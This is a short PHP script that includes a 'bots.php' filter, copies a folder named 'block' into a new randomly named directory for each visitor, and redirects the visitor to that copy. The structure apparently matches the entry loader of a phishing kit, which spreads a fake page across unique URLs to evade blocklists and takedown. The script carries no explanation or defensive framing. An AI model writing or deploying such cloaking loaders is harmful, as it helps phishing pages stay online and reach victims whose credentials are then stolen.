<?php
include 'bots.php';
$random = rand(1000000000,1000000000000).$_SERVER['REMOTE_ADDR'];
$dst    = substr(md5($random), 0, 25);

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}
$src="block";
recurse_copy( $src, $dst );
header("location:".$dst."");
exit;

?>
